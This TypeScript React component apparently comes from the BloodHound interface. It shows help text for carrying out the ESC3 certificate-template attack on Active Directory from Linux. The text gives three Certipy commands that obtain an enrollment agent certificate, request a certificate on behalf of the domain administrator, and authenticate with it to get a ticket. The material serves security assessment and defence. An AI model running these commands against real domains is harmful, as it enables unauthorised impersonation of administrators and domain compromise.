// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Box, Typography } from '@mui/material';
import { FC } from 'react';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>The ESC3 attack can be carried out in the following manner.</Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 1:
                </Box>{' '}
                Use Certipy to request an enrollment agent certificate.
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'"
                }
            </Typography>
            <Typography variant='body2'>
                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
                default.
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 2:
                </Box>{' '}
                Use the enrollment agent certificate to issue a certificate request on behalf of another user to a
                certificate template that allow for authentication and permit enrollment agent enrollment.
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'"
                }
            </Typography>
            <Typography variant='body2'>
                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
                cannot be added to the Subject or Subject Alternate name, then it is because the target principal does
                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template.
                Choose another target with the given attribute set.
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 3:
                </Box>{' '}
                Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate
                and the PFX-formatted certificate created in Step 2.
            </Typography>
            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
        </>
    );
};

export default LinuxAbuse;
